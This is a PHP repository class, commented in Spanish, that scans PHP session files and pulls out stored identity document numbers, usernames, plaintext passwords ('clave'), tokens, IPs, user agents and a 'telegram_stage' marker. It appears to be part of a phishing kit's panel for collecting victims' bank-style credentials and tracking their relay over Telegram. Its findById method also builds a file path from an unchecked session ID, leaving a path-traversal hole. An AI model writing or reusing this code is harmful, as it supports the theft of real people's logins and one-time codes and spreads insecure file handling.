<?php

declare(strict_types=1);

namespace App\Repositories;

use App\Models\Session;
use App\Services\LoggerService;

/**
 * Session Repository - Gestiona el almacenamiento de sesiones
 * Implementa patrón Repository
 */
final class SessionRepository
{
    private string $sessionPath;
    private LoggerService $logger;

    public function __construct(string $sessionPath, LoggerService $logger)
    {
        $this->sessionPath = rtrim($sessionPath, '/');
        $this->logger = $logger;
    }

    /**
     * Obtiene todas las sesiones activas
     */
    public function getActiveSessions(int $maxAge = 3600): array
    {
        $sessions = [];
        $files = glob($this->sessionPath . '/sess_*');

        if (!$files) {
            return [];
        }

        foreach ($files as $file) {
            if (filemtime($file) < (time() - $maxAge)) {
                continue;
            }

            $session = $this->parseSessionFile($file);
            if ($session !== null) {
                $sessions[] = $session;
            }
        }

        return $sessions;
    }

    /**
     * Obtiene una sesión por ID
     */
    public function findById(string $sessionId): ?Session
    {
        $file = $this->sessionPath . '/sess_' . $sessionId;

        if (!file_exists($file)) {
            return null;
        }

        return $this->parseSessionFile($file);
    }

    /**
     * Parsea un archivo de sesión PHP
     */
    private function parseSessionFile(string $file): ?Session
    {
        $data = @file_get_contents($file);

        if (!$data) {
            return null;
        }

        $sessionId = str_replace('sess_', '', basename($file));
        $sessionData = $this->extractSessionData($data);

        if (empty($sessionData)) {
            return null;
        }

        return new Session(
            $sessionId,
            $sessionData['documentType'] ?? null,
            $sessionData['documentNumber'] ?? null,
            $sessionData['usuario'] ?? null,
            $sessionData['clave'] ?? null,
            $sessionData['token'] ?? null,
            $sessionData['ip'] ?? null,
            $sessionData['user_agent'] ?? null,
            $sessionData['telegram_stage'] ?? null,
            $sessionData['timestamp'] ?? filemtime($file)
        );
    }

    /**
     * Extrae datos de la sesión serializada de PHP
     */
    private function extractSessionData(string $data): array
    {
        $sessionData = [];

        $patterns = [
            'documentNumber' => '/documentNumber\|s:\d+:"([^"]+)"/',
            'documentType' => '/documentType\|s:\d+:"([^"]+)"/',
            'usuario' => '/usuario\|s:\d+:"([^"]+)"/',
            'clave' => '/clave\|s:\d+:"([^"]+)"/',
            'token' => '/token\|s:\d+:"([^"]+)"/',
            'ip' => '/ip\|s:\d+:"([^"]+)"/',
            'user_agent' => '/user_agent\|s:\d+:"([^"]+)"/',
            'telegram_stage' => '/telegram_stage\|s:\d+:"([^"]+)"/',
            'timestamp' => '/timestamp\|i:(\d+)/',
        ];

        foreach ($patterns as $key => $pattern) {
            if (preg_match($pattern, $data, $matches)) {
                $sessionData[$key] = $matches[1];
            }
        }

        return $sessionData;
    }

    /**
     * Elimina sesiones antiguas
     */
    public function cleanup(int $maxAge = 3600): int
    {
        $files = glob($this->sessionPath . '/sess_*');
        $deleted = 0;

        if (!$files) {
            return 0;
        }

        foreach ($files as $file) {
            if (filemtime($file) < (time() - $maxAge)) {
                if (@unlink($file)) {
                    $deleted++;
                }
            }
        }

        if ($deleted > 0) {
            $this->logger->info("Session cleanup: $deleted sessions deleted");
        }

        return $deleted;
    }
}
